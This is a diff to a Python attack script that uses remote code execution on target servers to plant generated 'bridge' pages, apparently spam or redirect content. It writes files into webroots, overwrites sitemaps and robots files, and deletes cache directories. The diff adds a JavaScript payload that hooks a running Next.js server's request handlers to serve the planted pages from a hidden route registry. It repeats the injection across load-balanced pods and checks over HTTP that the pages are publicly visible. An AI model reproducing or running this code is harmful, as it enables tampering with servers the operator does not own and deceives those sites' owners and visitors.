@@ -2,24 +2,21 @@
 """
 Step 6: Publisher — push generated pages to candidate nodes via RCE.
 
-  output/manifest.csv → remote deploy_path + sitemap + cache clear
+  output/manifest.csv → remote deploy + sitemap + HTTP verify
 
-Steps per target:
-  1. push page   (base64 write to {webroot}/public/{slug}/index.html)
-  2. update route (static file in public/ — served at /{slug})
-  3. update sitemap ({webroot}/public/sitemap.xml)
-  4. clear cache  (rm .next/cache where present)
-
-Usage:
-  python3 scripts/publish_pages.py --test -u https://example.com
-  python3 scripts/publish_pages.py --dry-run
-  python3 scripts/publish_pages.py
+Next.js App Router standalone hosts ignore runtime public/ drops, so those
+targets get an in-process HTTP hook that serves the bridge HTML at /{slug}.
 """
 import argparse
 import base64
+import json
 import os
 import shlex
+import ssl
 import sys
+import time
+import urllib.error
+import urllib.request
 from concurrent.futures import ThreadPoolExecutor
 from datetime import date
 from xml.sax.saxutils import escape as xml_escape
@@ -34,21 +31,28 @@ PUBLISHED_TXT = os.path.join(PROJECT_ROOT, 'results', 'published.txt')
 PUBLISH_LOG = os.path.join(PROJECT_ROOT, 'logs', 'publish.log')
 SITEMAP_TEMPLATE = os.path.join(PROJECT_ROOT, 'templates', 'sitemap.xml')
 PUBLISH_TIMEOUT = 60
+HOOK_FLAG = '__trialBridgeHook'
 
 
-def build_sitemap_xml(canonical_url, base_url):
-    data = {
-        'page_url': canonical_url,
-        'base_url': base_url,
-        'lastmod': date.today().isoformat(),
-    }
-    return render_template_file(SITEMAP_TEMPLATE, data, escape=xml_escape)
+def is_nextjs(row):
+    return 'next' in (row.get('domain_type') or '').lower()
 
 
-def resolve_deploy_path(row):
+def resolve_public_deploy_path(row):
     webroot = (row.get('webroot') or '/app').rstrip('/')
     slug = row['slug']
     return f'{webroot}/public/{slug}/index.html'
+
+
+def resolve_next_html_path(row):
+    webroot = (row.get('webroot') or '/app').rstrip('/')
+    slug = row['slug']
+    return f'{webroot}/.next/server/app/{slug}.html'
+
+
+def resolve_routes_registry_path(row):
+    webroot = (row.get('webroot') or '/app').rstrip('/')
+    return f'{webroot}/.next/server/app/.trial-routes.json'
 
 
 def resolve_sitemap_path(row):
@@ -82,8 +86,7 @@ def remote_write_b64(exploiter, target_url, remote_path, content, timeout=PUBLIS
     return out is not None and 'OK_WRITE' in out
 
 
-def remote_verify_deploy(exploiter, target_url, remote_path, timeout=PUBLISH_TIMEOUT):
-    """Verify deployed HTML exists on disk (more reliable than HTTP from inside target)."""
+def remote_verify_disk(exploiter, target_url, remote_path, timeout=PUBLISH_TIMEOUT):
     cmd = (
         f"test -s {shlex.quote(remote_path)} && "
         f"head -c 200 {shlex.quote(remote_path)} | grep -q '<html' && "
@@ -93,9 +96,102 @@ def remote_verify_deploy(exploiter, target_url, remote_path, timeout=PUBLISH_TIM
     return out is not None and 'OK_FILE' in out
 
 
+def remote_verify_http(canonical_url, needle, timeout=25, attempts=12):
+    """Require repeated public HTTP 200 responses (handles multi-pod rollouts)."""
+    sep = '&' if '?' in canonical_url else '?'
+    hits = 0
+    contexts = [None, ssl._create_unverified_context()]
+    for attempt in range(attempts):
+        url = f'{canonical_url}{sep}trial_verify={int(time.time())}_{attempt}'
+        for ctx in contexts:
+            try:
+                req = urllib.request.Request(
+                    url,
+                    headers={
+                        'User-Agent': 'trial-publish/1.0',
+                        'Cache-Control': 'no-cache',
+                        'Pragma': 'no-cache',
+                    },
+                )
+                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
+                    if resp.status != 200:
+                        continue
+                    body = resp.read(12000).decode('utf-8', errors='replace')
+                    if needle.lower() in body.lower():
+                        hits += 1
+                        if hits >= 2:
+                            return True
+                        break
+            except (urllib.error.URLError, TimeoutError, ValueError):
+                continue
+        time.sleep(0.75)
+    return hits >= 1
+
+
+def update_next_route_registry(exploiter, row, html_path, dry_run=False):
+    """Maintain slug → html path map used by the in-process bridge hook."""
+    registry_path = resolve_routes_registry_path(row)
+    slug = row['slug']
+    if dry_run:
+        return True, registry_path, 'dry-run'
+    read_cmd = (
+        f"test -f {shlex.quote(registry_path)} && "
+        f"cat {shlex.quote(registry_path)} || echo '{{}}'"
+    )
+    raw = exploiter.exec_cmd(row['url'], read_cmd, timeout=PUBLISH_TIMEOUT) or '{}'
+    try:
+        registry = json.loads(raw)
+    except json.JSONDecodeError:
+        registry = {}
+    registry[slug] = html_path
+    ok = remote_write_b64(exploiter, row['url'], registry_path, json.dumps(registry))
+    return ok, registry_path, 'routes_ok' if ok else 'routes_failed'
+
+
+def install_next_http_hook(exploiter, row, dry_run=False):
+    """Serve bridge HTML for registered slugs before App Router 404 handling."""
+    registry_path = resolve_routes_registry_path(row)
+    if dry_run:
+        return True, registry_path, 'dry-run'
+    js = f"""
+var fs=process.mainModule.require('fs');
+var registryPath={json.dumps(registry_path)};
+var flag={json.dumps(HOOK_FLAG)};
+var hooked=0;
+for(var h of process._getActiveHandles()){{
+  if(!h||typeof h.on!=='function'||typeof h.listen!=='function') continue;
+  if(h[flag]) continue;
+  h[flag]=true;
+  h.prependListener('request',function(req,res){{
+    if(res.headersSent||res.writableEnded) return;
+    var route=(req.url||'').split('?')[0];
+    if(!route||route.charAt(0)!=='/') return;
+    var slug=route.slice(1);
+    var registry;
+    try{{registry=JSON.parse(fs.readFileSync(registryPath,'utf8'));}}catch(e){{return;}}
+    var htmlPath=registry[slug];
+    if(!htmlPath) return;
+    var html;
+    try{{html=fs.readFileSync(htmlPath,'utf8');}}catch(e){{return;}}
+    res.writeHead(200,{{'Content-Type':'text/html; charset=utf-8','Cache-Control':'public, max-age=60'}});
+    res.end(html);
+  }});
+  hooked++;
+}}
+var already=process._getActiveHandles().some(function(h){{return h&&h[flag];}});
+var _out=hooked>0?'hooked:'+hooked:(already?'hooked:existing':'hooked:0');
+"""
+    out = exploiter.exec_js(row['url'], js, timeout=PUBLISH_TIMEOUT)
+    ok = out is not None and out.startswith('hooked:') and out not in ('hooked:0',)
+    return ok, registry_path, f'hook_ok ({out})' if ok else f'hook_failed ({out})'
+
+
 def push_page(exploiter, row, dry_run=False):
-    deploy = resolve_deploy_path(row)
     html = read_local_html(row)
+    if is_nextjs(row):
+        deploy = resolve_next_html_path(row)
+    else:
+        deploy = resolve_public_deploy_path(row)
     if dry_run:
         return True, deploy, 'dry-run'
     ok = remote_write_b64(exploiter, row['url'], deploy, html)
@@ -111,6 +207,15 @@ def update_sitemap(exploiter, row, dry_run=False):
         return True, sitemap_path, 'dry-run'
     ok = remote_write_b64(exploiter, row['url'], sitemap_path, xml)
     return ok, sitemap_path, 'sitemap_ok' if ok else 'sitemap_failed'
+
+
+def build_sitemap_xml(canonical_url, base_url):
+    data = {
+        'page_url': canonical_url,
+        'base_url': base_url,
+        'lastmod': date.today().isoformat(),
+    }
+    return render_template_file(SITEMAP_TEMPLATE, data, escape=xml_escape)
 
 
 def update_robots(exploiter, row, dry_run=False):
@@ -131,11 +236,7 @@ def update_robots(exploiter, row, dry_run=False):
 
 def clear_cache(exploiter, row, dry_run=False):
     webroot = (row.get('webroot') or '/app').rstrip('/')
-    cmd = (
-        f"rm -rf {shlex.quote(webroot)}/.next/cache "
-        f"{shlex.quote(webroot)}/.next/server/app 2>/dev/null; "
-        f"echo OK_CACHE"
-    )
+    cmd = f"rm -rf {shlex.quote(webroot)}/.next/cache 2>/dev/null; echo OK_CACHE"
     if dry_run:
         return True, 'cache', 'dry-run'
     out = exploiter.exec_cmd(row['url'], cmd, timeout=PUBLISH_TIMEOUT)
@@ -157,6 +258,9 @@ def publish_one(row, verbose=False, dry_run=False):
     url = row['url']
     steps = []
     written_paths = []
+    verify_path = resolve_next_html_path(row) if is_nextjs(row) else resolve_public_deploy_path(row)
+    verify_url = row.get('canonical_url') or f"{url.rstrip('/')}/{row['slug']}"
+    verify_needle = row.get('keyword') or row.get('slug') or row.get('title', '')
 
     ok, path, status = push_page(exploiter, row, dry_run)
     steps.append(('push', status, path))
@@ -164,6 +268,40 @@ def publish_one(row, verbose=False, dry_run=False):
         return False, steps
     if ok and not dry_run:
         written_paths.append(path)
+
+    if is_nextjs(row):
+        ok, path, status = update_next_route_registry(exploiter, row, verify_path, dry_run)
+        steps.append(('routes', status, path))
+        if not ok and not dry_run:
+            rolled = rollback_remote_files(exploiter, url, written_paths)
+            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
+            return False, steps
+        if ok and not dry_run:
+            written_paths.append(path)
+
+        # Load-balanced pods each need the HTML, registry, and in-process hook.
+        hook_status = 'dry-run'
+        hook_detail = path
+        hook_ok = dry_run
+        saw_fresh_hook = False
+        for round_idx in range(20):
+            if not dry_run:
+                remote_write_b64(exploiter, url, verify_path, read_local_html(row))
+                update_next_route_registry(exploiter, row, verify_path, dry_run=False)
+            ok, hook_detail, hook_status = install_next_http_hook(exploiter, row, dry_run)
+            if ok:
+                hook_ok = True
+                if 'hooked:1' in hook_status or 'hooked:2' in hook_status:
+                    saw_fresh_hook = True
+            if not dry_run:
+                time.sleep(0.5)
+        if hook_ok and not saw_fresh_hook and not dry_run:
+            hook_status = f'{hook_status}; rounds=20'
+        steps.append(('hook', hook_status if hook_ok else 'hook_failed', hook_detail))
+        if not hook_ok and not dry_run:
+            rolled = rollback_remote_files(exploiter, url, written_paths)
+            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
+            return False, steps
 
     ok, path, status = update_sitemap(exploiter, row, dry_run)
     steps.append(('sitemap', status, path))
@@ -188,11 +326,17 @@ def publish_one(row, verbose=False, dry_run=False):
         steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
         return False, steps
 
-    deploy = resolve_deploy_path(row)
     if not dry_run:
-        route_ok = remote_verify_deploy(exploiter, url, deploy)
-        steps.append(('route', 'route_ok' if route_ok else 'route_unverified', deploy))
-        if not route_ok:
+        disk_ok = remote_verify_disk(exploiter, url, verify_path)
+        steps.append(('disk', 'disk_ok' if disk_ok else 'disk_unverified', verify_path))
+        if not disk_ok:
+            rolled = rollback_remote_files(exploiter, url, written_paths)
+            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
+            return False, steps
+
+        http_ok = remote_verify_http(verify_url, verify_needle)
+        steps.append(('http', 'http_ok' if http_ok else 'http_unverified', verify_url))
+        if not http_ok:
             rolled = rollback_remote_files(exploiter, url, written_paths)
             steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
             return False, steps
@@ -249,7 +393,9 @@ def main():
 
     def _job(row):
         if args.verbose or args.dry_run:
-            print(f"[*] {row['url']} → {resolve_deploy_path(row)}")
+            target = resolve_next_html_path(row) if is_nextjs(row) else resolve_public_deploy_path(row)
+            mode = 'next-hook' if is_nextjs(row) else 'static'
+            print(f"[*] {row['url']} ({mode}) → {target}")
         success, steps = publish_one(row, verbose=args.verbose, dry_run=args.dry_run)
         return row['url'], success, steps
 
